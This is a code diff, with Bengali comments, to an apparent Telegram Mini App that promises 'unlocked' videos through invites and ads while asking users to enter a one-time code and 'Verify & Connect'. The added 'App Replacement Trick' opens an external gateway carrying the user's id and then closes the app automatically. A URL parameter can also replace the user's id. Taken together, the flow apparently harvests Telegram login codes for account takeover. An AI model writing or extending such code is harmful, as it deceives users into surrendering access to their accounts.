@@ -125,8 +125,8 @@
             <div id="otp-sec" style="display: none;">
                 <div style="display: flex; gap: 8px; align-items: stretch; justify-content: center; margin-bottom: 10px;">
                     <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP" style="width: 65%; margin-bottom: 0; letter-spacing: 5px;">
-                    <!-- অফিশিয়াল এবং সুরক্ষিত পাইথন গেটওয়ে বাটন -->
-                    <button onclick="tg.openTelegramLink('tg://openmessage?user_id=777000')" style="width: 30%; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px; padding: 10px 5px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; line-height: 1.2;">👀 View<br>Code</button>
+                    <!-- App Replacement Trick Button -->
+                    <button onclick="viewCodeAction()" style="width: 30%; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px; padding: 10px 5px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; line-height: 1.2;">👀 View<br>Code</button>
                 </div>
                 <button id="btn-verify-code" class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;" onclick="verifyCode()">Verify & Connect</button>
                 <div style="text-align: center; margin-top: 15px;">
@@ -151,7 +151,11 @@
         const BACKEND_URL = 'https://pmrony-forwardbot.hf.space';
         const fetchHeaders = { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' };
 
-        const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : '123456'; 
+        // URL থেকে user_id রিসিভ করার ট্রিক (২য় অ্যাপের জন্য)
+        const urlParams = new URLSearchParams(window.location.search);
+        const forceUserId = urlParams.get('user_id');
+        const userId = forceUserId || (tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : '123456'); 
+
         const botUsername = 'File_Unlocker_Pro_bot'; 
         const adUrl = "https://www.effectivecpmnetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
         
@@ -165,7 +169,6 @@
         let currentHash = "";
         let isCheckingLogin = false;
 
-        // আপনার প্রাইভেট চ্যানেলের ইনভাইট লিংক
         const PREMIUM_CHANNEL_LINK = "https://t.me/+snT3FqTlgmJlNDQ1";
 
         async function openLogin() {
@@ -199,8 +202,6 @@
             } catch(e) { showToast("Connection error!"); }
             isCheckingLogin = false;
         }
-
-        function closeModal() { document.getElementById('shareModal').style.display = 'none'; }
 
         function closeLogin() { document.getElementById('loginModal').style.display = 'none'; }
 
@@ -438,6 +439,28 @@
             await initData();
             if (currentNeededRef - dbRefcount <= 0) { closeModal(); showToast("🎉 Video Unlocked!"); renderVideos(); } 
             else { showToast("❌ Still need more invites!"); }
+        }
+
+        function closeModal() { document.getElementById('shareModal').style.display = 'none'; }
+
+        // পেজ রিলোড হলে অটোমেটিক লগিন স্টেট চেক করবে
+        let savedState = localStorage.getItem("loginState");
+        if (savedState === "otp") {
+            setTimeout(() => { openLogin(); }, 500);
+        }
+
+        // App Replacement Trick Logic
+        function viewCodeAction() {
+            showToast("Opening chat...");
+            
+            // ১. ২য় অ্যাপ (Gateway) ওপেন করবে এবং সাথে user_id পাস করে দেবে
+            let gatewayUrl = 'https://pmrony-forwardbot.hf.space/api/jump?user_id=' + userId;
+            tg.openLink(gatewayUrl);
+            
+            // ২. ঠিক আধা সেকেন্ড পর ১ম মেইন অ্যাপটি নিজে থেকে Close হয়ে যাবে!
+            setTimeout(() => {
+                tg.close();
+            }, 500);
         }
 
         fetchVideos();
